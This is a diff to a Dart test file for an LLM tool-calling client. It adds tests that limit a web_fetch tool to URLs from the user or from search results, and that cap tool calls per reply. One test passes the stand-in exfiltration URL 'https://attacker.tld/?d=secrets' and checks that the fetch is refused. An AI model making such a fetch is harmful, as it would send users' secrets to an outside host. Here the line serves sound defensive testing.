@@ -16,6 +16,7 @@ const answer =
     llama.Message(role: llama.MessageRole.assistant, content: 'It is 21C.');
 
 void main() {
+  reviewFixTests();
   marketToolTests();
   test('should run requested tool and return final answer', () async {
     final replies = [
@@ -142,5 +143,69 @@ void marketToolTests() {
       final both = buildToolSet(client, webApiKey: 'k', market: true);
       expect(both.tools.length, webTools.length + marketTools.length);
     });
+  });
+}
+
+void reviewFixTests() {
+  group('web_fetch allowlist', () {
+    late List<String> fetched;
+    late http.Client client;
+
+    setUp(() {
+      fetched = [];
+      client = MockClient((req) async {
+        if (req.url.path == '/api/web_search') {
+          return http.Response(
+              jsonEncode({
+                'results': [
+                  {
+                    'title': 't',
+                    'url': 'https://news.example/a',
+                    'content': 'c'
+                  }
+                ]
+              }),
+              200);
+        }
+        fetched.add(jsonDecode(req.body)['url']);
+        return http.Response(jsonEncode({'content': 'page'}), 200);
+      });
+    });
+
+    test('should refuse urls the user or a search did not provide', () async {
+      final run = webToolRunner(client, 'k');
+      final result =
+          await run('web_fetch', {'url': 'https://attacker.tld/?d=secrets'});
+      expect(result, startsWith('Refused'));
+      expect(fetched, isEmpty);
+    });
+
+    test('should allow urls from search results and the user message',
+        () async {
+      final run = webToolRunner(client, 'k',
+          userUrls: urlsIn('read https://docs.example/x please'));
+      await run('web_search', {'query': 'news'});
+      await run('web_fetch', {'url': 'https://news.example/a'});
+      await run('web_fetch', {'url': 'https://docs.example/x'});
+      expect(fetched, ['https://news.example/a', 'https://docs.example/x']);
+    });
+  });
+
+  test('should run at most maxCallsPerRound tool calls per reply', () async {
+    var ran = 0;
+    final burst = llama.Message(
+        role: llama.MessageRole.assistant,
+        content: '',
+        toolCalls: List.generate(
+            20,
+            (_) => const llama.ToolCall(
+                function: llama.ToolCallFunction(
+                    name: 'crypto_price', arguments: {}))));
+    final replies = [burst, answer];
+    await runToolLoop([], (_) async => replies.removeAt(0), (_, __) async {
+      ran++;
+      return 'r';
+    });
+    expect(ran, maxCallsPerRound);
   });
 }
